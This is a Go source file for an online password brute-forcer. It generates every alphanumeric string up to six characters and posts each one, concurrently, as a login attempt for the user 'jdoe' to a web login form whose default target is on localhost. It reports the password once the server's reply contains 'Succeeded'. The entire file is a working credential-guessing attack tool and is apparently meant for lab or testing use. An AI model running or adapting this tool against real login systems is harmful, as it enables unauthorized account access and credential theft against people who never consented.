package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
)

const (
	defaultCharset   = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	defaultMaxLength = 6
	defaultLoginUrl  = "http://localhost:1759/user_login_submit"
	defaultUser      = "jdoe"
)

var (
	charset   string
	maxLength int
	user      string
	loginUrl  string
)

func main() {
	flag.StringVar(&user, "user", defaultUser, "user to find password for")
	flag.StringVar(&loginUrl, "login url", defaultLoginUrl,
		"url to post login form to")
	flag.IntVar(&maxLength, "max password length", defaultMaxLength,
		"max length of passwords to brute force for")
	flag.StringVar(&charset, "charset", defaultCharset,
		"characters to generate passwords with")
	flag.Parse()

	var wg sync.WaitGroup

	for i := 0; i < maxLength; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()

			runes := make([]rune, i+1)
			brute(runes, 0, i)
		}(i)
	}

	wg.Wait()

	fmt.Fprintln(os.Stderr, "Password not found!")
	os.Exit(1)
}

func brute(runes []rune, index, maxDepth int) {
	for _, c := range charset {
		runes[index] = c

		if index == maxDepth {
			if tryLogin(string(runes)) {
				fmt.Println("Password found!")
				fmt.Printf("username: %s\nPassword: %s\n", user, string(runes))
				os.Exit(0)
			}
		} else {
			brute(runes, index+1, maxDepth)
		}
	}
}

func tryLogin(pass string) bool {
	res, err := http.PostForm(loginUrl, url.Values{
		"userName":   {user},
		"x":          {pass},
		"ldapServer": {"0"},
		"action":     {"loginSmall"},
	})

	if err != nil {
		log.Fatal(err)
	}
	contents, err := ioutil.ReadAll(res.Body)
	res.Body.Close()
	if err != nil {
		log.Fatal(err)
	}

	if strings.Contains(string(contents), "Succeeded") {
		return true
	}
	return false
}
